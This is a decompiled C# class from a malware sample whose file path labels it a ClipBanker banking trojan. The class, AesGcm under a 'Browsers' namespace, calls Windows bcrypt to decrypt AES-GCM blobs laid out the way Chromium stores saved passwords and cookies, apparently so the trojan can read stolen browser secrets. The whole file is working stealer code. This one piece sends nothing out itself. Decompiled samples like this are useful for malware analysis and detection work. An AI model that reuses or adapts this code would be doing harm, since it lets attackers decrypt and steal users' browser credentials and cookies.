// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Browsers.AesGcm
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using FtpClient.Models.Enums;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace FtpClient.Data.Browsers
{
  public class AesGcm
  {
    public const string BCryptDecrypt = "BCryptDecrypt";

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptOpenAlgorithmProvider(
      out IntPtr phAlgorithm,
      [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
      [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
      uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptGetProperty(
      IntPtr hObject,
      [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
      byte[] pbOutput,
      int cbOutput,
      ref int pcbResult,
      uint flags);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
    internal static extern uint BCryptSetAlgorithmProperty(
      IntPtr hObject,
      [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
      byte[] pbInput,
      int cbInput,
      int dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptImportKey(
      IntPtr hAlgorithm,
      IntPtr hImportKey,
      [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
      out IntPtr phKey,
      IntPtr pbKeyObject,
      int cbKeyObject,
      byte[] pbInput,
      int cbInput,
      uint dwFlags);

    [DllImport("bcrypt.dll")]
    public static extern uint BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptDecrypt")]
    public static extern uint rgdfg(
      IntPtr hKey,
      byte[] pbInput,
      int cbInput,
      ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
      byte[] pbIV,
      int cbIV,
      byte[] pbOutput,
      int cbOutput,
      ref int pcbResult,
      int dwFlags);

    public static byte[] Decrypt(byte[] bEncryptedData, byte[] bMasterKey)
    {
      byte[] numArray1 = new byte[12]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0
      };
      Array.Copy((Array) bEncryptedData, 3, (Array) numArray1, 0, 12);
      try
      {
        byte[] numArray2 = new byte[bEncryptedData.Length - 15];
        Array.Copy((Array) bEncryptedData, 15, (Array) numArray2, 0, bEncryptedData.Length - 15);
        byte[] numArray3 = new byte[16];
        byte[] numArray4 = new byte[numArray2.Length - numArray3.Length];
        Array.Copy((Array) numArray2, numArray2.Length - 16, (Array) numArray3, 0, 16);
        Array.Copy((Array) numArray2, 0, (Array) numArray4, 0, numArray2.Length - numArray3.Length);
        return new AesGcm().Decrypt(bMasterKey, numArray1, (byte[]) null, numArray4, numArray3);
      }
      catch
      {
      }
      return (byte[]) null;
    }

    public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
    {
      IntPtr num1 = this.OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
      IntPtr hKey;
      IntPtr hglobal = this.ImportKey(num1, key, out hKey);
      BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
      byte[] pbOutput;
      using (pPaddingInfo)
      {
        byte[] pbIV = new byte[this.MaxAuthTagSize(num1)];
        int pcbResult = 0;
        uint num2 = AesGcm.rgdfg(hKey, cipherText, cipherText.Length, ref pPaddingInfo, pbIV, pbIV.Length, (byte[]) null, 0, ref pcbResult, 0);
        if (num2 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", (object) num2));
        pbOutput = new byte[pcbResult];
        uint num3 = AesGcm.rgdfg(hKey, cipherText, cipherText.Length, ref pPaddingInfo, pbIV, pbIV.Length, pbOutput, pbOutput.Length, ref pcbResult, 0);
        if (num3 == 3221266434U)
          throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
        if (num3 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", (object) num3));
      }
      int num4 = (int) AesGcm.BCryptDestroyKey(hKey);
      Marshal.FreeHGlobal(hglobal);
      int num5 = (int) AesGcm.BCryptCloseAlgorithmProvider(num1, 0U);
      return pbOutput;
    }

    private int MaxAuthTagSize(IntPtr hAlg)
    {
      byte[] property = this.GetProperty(hAlg, "AuthTagLength");
      return BitConverter.ToInt32(new byte[4]
      {
        property[4],
        property[5],
        property[6],
        property[7]
      }, 0);
    }

    private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
    {
      IntPtr phAlgorithm = IntPtr.Zero;
      uint num1 = AesGcm.BCryptOpenAlgorithmProvider(out phAlgorithm, alg, provider, 0U);
      if (num1 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", (object) num1));
      byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
      uint num2 = AesGcm.BCryptSetAlgorithmProperty(phAlgorithm, "ChainingMode", bytes, bytes.Length, 0);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(ChainingMode, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", (object) num2));
      return phAlgorithm;
    }

    private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
    {
      int int32 = BitConverter.ToInt32(this.GetProperty(hAlg, "ObjectLength"), 0);
      IntPtr pbKeyObject = Marshal.AllocHGlobal(int32);
      byte[] pbInput = this.Concat(BitConverter.GetBytes(1296188491), BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key);
      uint num = AesGcm.BCryptImportKey(hAlg, IntPtr.Zero, "KeyDataBlob", out hKey, pbKeyObject, int32, pbInput, pbInput.Length, 0U);
      if (num > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", (object) num));
      return pbKeyObject;
    }

    private byte[] GetProperty(IntPtr hAlg, string name)
    {
      int pcbResult = 0;
      uint property1 = AesGcm.BCryptGetProperty(hAlg, name, (byte[]) null, 0, ref pcbResult, 0U);
      if (property1 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", (object) property1));
      byte[] pbOutput = new byte[pcbResult];
      uint property2 = AesGcm.BCryptGetProperty(hAlg, name, pbOutput, pbOutput.Length, ref pcbResult, 0U);
      if (property2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", (object) property2));
      return pbOutput;
    }

    public byte[] Concat(params byte[][] arrays)
    {
      int num = 0;
      foreach (byte[] array in arrays)
      {
        if (array != null)
          num += array.Length;
      }
      byte[] dst = new byte[num - 1 + 1];
      int dstOffset = 0;
      foreach (byte[] array in arrays)
      {
        if (array != null)
        {
          Buffer.BlockCopy((Array) array, 0, (Array) dst, dstOffset, array.Length);
          dstOffset += array.Length;
        }
      }
      return dst;
    }
  }
}
